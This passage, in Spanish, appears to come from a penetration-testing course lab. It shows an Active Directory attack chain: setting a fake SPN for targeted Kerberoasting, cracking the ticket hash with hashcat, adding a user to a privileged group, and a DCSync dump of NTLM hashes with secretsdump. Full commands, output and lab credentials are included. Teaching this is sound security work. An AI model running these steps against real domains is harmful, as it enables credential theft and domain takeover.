To recap, exploramos el entorno de Active Directory y obtuvimos el siguiente par de credenciales:

`mssqladm:DBAilfreight1!`

Profundizando en los datos de BloodHound, vemos que tenemos `GenericWrite` sobre el usuario `ttimmons`. Usando esto, podemos configurar un SPN falso en la cuenta `ttimmons` y realizar un ataque Kerberoasting dirigido. Si este usuario está utilizando una contraseña débil, podemos descifrarla y continuar.

![text](https://academy.hackthebox.com/storage/modules/163/ttimmons.png)

Regresemos a la máquina `DEV01` donde habíamos cargado PowerView. Podemos crear un objeto PSCredential para poder ejecutar comandos como el usuario `mssqladm` sin tener que usar RDP nuevamente.

```r
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

Luego usaremos `Set-DomainObject` para configurar un SPN falso en la cuenta objetivo. Crearemos un SPN llamado `acmetesting/LEGIT`, que por supuesto eliminaremos más tarde y anotaremos en los apéndices de nuestro informe.

```r
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons
```

Después podemos volver a nuestro host de ataque y usar `GetUserSPNs.py` para realizar un ataque Kerberoasting dirigido.

```r
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:389-<><>-OK
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>               



|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:88-<><>-OK
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$6c391145c0c6430a1025df35c3e674c4$2d66d2dc6622c6af0a9afd0b1934220363f74726dcaa38ad49ec37b54b0dfe4e0ad42a443cc825fd49bea230748e1467b53be757b432a8d3fbc7ba1817d9bac69159ff86381fc4ae266210ee228c8f9de4c103d6d3a16039ea5f41cd2483a77e0e6486ea7cf78539b27aa26f8b245a611a52c0de9b11abe36a02ad5f8e9d5ee9b821db4834c0168d3426ea57acd4f82cdd0edd64a649df01cc9db28fea597c2910ffd67146ab571a9b19ddea34a2b991382394bd36efa5be9da947e44f0ac040df2a55ebd791a08fbfe25634483624cca1d4dadeab9327e0fe328ab9ae128d75d4c9908a3878c03ab20821edecca73df6066d0ead15e9b2c97c417de1f1cb2b6fe0890388a1738f420e69f7bb07b414e860774a414452ba613d62cc516a5e5fff58567573ad721992c6e036553f250372d053148bf4d88a<SNIP>
```

Luego iniciaremos Hashcat para ver si el usuario está usando una contraseña débil.

```r
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$$6c391145c0c6430a1025df35c3e674c4$2d66d2dc6622c6af0a9afd0b1934220363f74726dcaa38ad49ec37b54b0dfe4e0ad42a443cc825fd49bea230748e1467b53be757b432a8d3fbc7ba1817d9bac69159ff86381fc4ae266210ee228c8f9de4c103d6d3a16039ea5f41cd2483a77e0e6486ea7cf78539b27aa26f8b245a611a52c0de9b11abe36a02ad5f8e9d5ee9b821db4834c0168d3426ea57acd4f82cdd0edd64a649df01cc9db28fea597c2910ffd67146ab571a9b19ddea34a2b991382394bd36efa5be9da947e44f0ac040df2a55ebd791a08fbfe25634483624cca1d4dadeab9327e0fe328ab9ae128d75d4c9908a3878c03ab20821edecca73df6066d0ead15e9b2c97c417de1f1cb2b6fe0890388a1738f420e69f7bb07b414e860774a414452ba613d62cc516a5e5fff58567573ad721992c6e036553f250372d053148bf4d88a<SNIP>:<PASSWORD REDACTED>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFRE...6e6976
Time.Started.....: Wed Jun 22 16:32:27 2022 (22 secs)
Time.Estimated...: Wed Jun 22 16:32:49 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   485.7 kH/s (2.50ms) @ Accel:16 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10678272/14344385 (74.44%)
Rejected.........: 0/10678272 (0.00%)
Restore.Point....: 10672128/14344385 (74.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Rock4ever! -> Redeye2

Started: Wed Jun 22 16:32:24 2022
Stopped: Wed Jun 22 16:32:51 2022
```

¡Lo está! Ahora tenemos otro par de credenciales, es hora de usar el usuario `ttimmons`. Veamos qué tipo de acceso tiene este usuario. Mirando nuevamente en BloodHound, vemos que tenemos `GenericAll` sobre el grupo `SERVER ADMINS`.

![text](https://academy.hackthebox.com/storage/modules/163/ttimmons_server_admins.png)

Mirando un poco más, vemos que el grupo `SERVER ADMINS` tiene la capacidad de realizar el ataque DCSync para obtener hashes de contraseñas NTLM de cualquier usuario en el dominio.

![text](https://academy.hackthebox.com/storage/modules/163/dcsync.png)

Abusamos de esto primero agregando el usuario `ttimmons` al grupo. Primero necesitaremos crear otro objeto PSCredential.

```r
PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

Una vez hecho esto, podemos agregar el usuario al grupo objetivo y heredar los privilegios de DCSync.

```r
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622
```

Finalmente, podemos usar Secretsdump para DCSync todos los hashes de contraseñas NTLM del Domain Controller.

```r
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:49676-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e55xxxxxxxxxx787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::

<SNIP>
```

---

## Next Steps

Después de asegurarnos de documentar todos nuestros pasos, podríamos realizar varias acciones, muchas de las cuales se detallan en la siguiente sección. Definitivamente es una buena idea volcar toda la base de datos NTDS y realizar cracking de contraseñas offline para dar al cliente una idea de la fortaleza de sus contraseñas y otras métricas. También podrías mostrar evidencia de poder autenticarse en un Domain Controller y ejecutar algunos comandos, ya que esto puede ser más impactante que ver la salida de secretsdump, con la que pueden no estar familiarizados. Conectarse al Domain Controller vía RDP e incluir una captura de pantalla en el informe mostrando una consola abierta con los resultados de los comandos `hostname`, `whoami` y `ipconfig /all` puede ser una gran visual. También hay mucho valor adicional que podemos agregar después de obtener Domain Admin al realizar pasos adicionales de auditoría de AD, atacando trusts de dominio y bosque (si están en el alcance) y, finalmente, probando la capacidad de alerta del cliente ya sea creando un nuevo Domain Admin y Enterprise Admin o agregando una cuenta que controlamos en cada uno de estos grupos. Idealmente, están monitoreando estos grupos altamente privilegiados y lo detectarán y ya sea manualmente, o mejor aún, tendrán algo automatizado en su lugar para eliminar las cuentas de los grupos. Si haces esto, definitivamente incluye esta acción en el informe como un cambio de configuración en los apéndices y también da créditos al cliente si lo detectan y actúan apropiadamente. Dar crédito por las cosas buenas que ves en la red/el cliente hace es importante y contribuye mucho a construir buena voluntad.